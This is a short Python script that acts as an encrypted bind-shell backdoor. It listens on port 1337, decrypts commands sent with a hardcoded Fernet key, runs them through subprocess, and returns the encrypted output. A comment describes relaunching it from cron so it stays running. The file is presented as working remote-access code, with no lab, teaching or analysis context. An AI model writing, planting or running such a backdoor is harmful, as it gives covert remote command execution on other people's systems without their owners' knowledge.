import socket
import subprocess
from cryptography.fernet import Fernet
import time

key = b'TQenjgBHJFv6Ep4v8eN0Bayf194BS6qV_X23n5ulnRQ='

def server_program():
    # get the hostname
    port = 1337  # initiate port no above 1024

    # look closely. The bind() function takes tuple as argument

    # configure how many client the server can listen simultaneously
    
    f = Fernet(key)

    try:
        # while True:
        server_socket = socket.socket()  # get instance
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('', port))  # bind host address and port together
        server_socket.listen(10)
    except:
        # catches exceptions for the program already running, allowing us to set
        # up cron jobs that run regularly
        exit()
    
    conn, address = server_socket.accept()  # accept new connection
    curr_time = time.localtime()

    while True:
        # receive data stream. it won't accept data packet greater than 1024 bytes
        data = conn.recv(65536).decode()
        if not data:
            # if data is not received break
            break
        # before running commands auth using AES
        # we need a private key
        data = str(f.decrypt(data).decode())
        command = data
        
        try:
            result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
        except :
            pass
            # send data to the client
        res = f.encrypt(result.stdout)
        conn.send(res)
    conn.close()  # close the connection
    curr_time = time.localtime()
            

if __name__ == '__main__':
    server_program()